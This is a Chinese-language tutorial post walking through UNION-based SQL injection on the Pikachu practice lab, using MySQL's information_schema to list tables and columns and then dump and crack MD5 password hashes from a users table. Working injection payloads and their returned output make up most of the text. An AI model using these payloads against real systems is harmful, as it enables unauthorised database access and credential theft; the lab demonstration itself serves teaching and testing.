---
title: "通过information_schema拿下数据库案例演示"
date: 2024-07-23
---
---

# information_schema 有什么用？

在 mysql 中，自带的**information_schema**这个表里面存放了大量的重要信息。
比如 :

1. **SCHEMATA 表**:提供了当前 mysql 实例中所有**数据库的信息**。
2. **TABLES 表**:提供了关于数据库中的**表的信息(包括视图)**。
3. **COLUMNS 表**:提供了表中的**列信息**。

通过**information_schema**和**union**操作，我们可以查询到数据库中所有表的列信息

# 完整演示

以字符型注入为例

## 检查是否存在注入点

输入定界符或引用符
在这里我们输入单引号`'`,报错，说明参与了后台的字符串拼接，可以进行注入。

```sql
# 报错信息
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1
```

## order by 确定字段数

输入，根据返回信息确定字段数为`2`

```sql
kobe' order by 5#
kobe' order by 3#
kobe' order by 2#
```

## union 查询数据库基础信息

```sql
kobe' union select version(),database()#
kobe' union select user(),database()#
# version(); //取的数据库版本5.7.26
# database();//取得当前的数据库root
# user(); //取得当前登录的用户root@localhost
```

## information_schema 查询表名

```sql
# 获取表名:
select id,email from member where username = 'kobe' union select table_schema,table_name from information_schema.tables where table_schema='root';
# payload:
kobe' union select table_schema,table_name from information_schema.tables where table_schema='root'#
```

输入 payload，返回:

```sql
your uid:3
your email is: kobe@pikachu.com

your uid:root
your email is: httpinfo

your uid:root
your email is: member

your uid:root
your email is: message

your uid:root
your email is: users

your uid:root
your email is: xssblind
```

得到表名：

- httpinfo
- member
- message
- users
- xssblind

## 进一步查询列名

查**users**

```sql
#获取列名:
select id,email from member where username = 'kobe' union select table_name,column_name from information_schema.columns where table_name='users';
# payload:
kobe' union select table_name,column_name from information_schema.columns where table_name='users';#
```

输入 payload，返回:

```sql
your uid:3
your email is: kobe@pikachu.com

your uid:users
your email is: USER

your uid:users
your email is: CURRENT_CONNECTIONS

your uid:users
your email is: TOTAL_CONNECTIONS

your uid:users
your email is: id

your uid:users
your email is: username

your uid:users
your email is: password

your uid:users
your email is: level
```

得到列名：

- USER
- CURRENT_CONNECTIONS
- TOTAL_CONNECTIONS
- id
- username
- password
- level

## 获取数据

查**username**和**password**

```sql
# 获取内容
select id,email from member where username= 'kobe' union select username,password from users;
# payload:
kobe' union select username,password from users#
```

输入 payload，返回:

```sql
your uid:3
your email is: kobe@pikachu.com

your uid:admin
your email is: e10adc3949ba59abbe56e057f20f883e

your uid:pikachu
your email is: 670b14728ad9902aecba32e22fa4f6bd

your uid:test
your email is: e99a18c428cb38d5f260853678922e03
```

得到数据：

- admin:e10adc3949ba59abbe56e057f20f883e
- pikachu:670b14728ad9902aecba32e22fa4f6bd
- test:e99a18c428cb38d5f260853678922e03

password 的 md5 值，可以用网站进行解密
[md5 在线解密破解,md5 解密加密](https://www.cmd5.com/)
查询结果：

- admin:123456
- pikachu:000000
- test:abc123

# 总结

根据以上演示，我们可以通过 sql 注入漏洞，使用 information_schema 表，查询到数据库信息，列名，表名，数据。
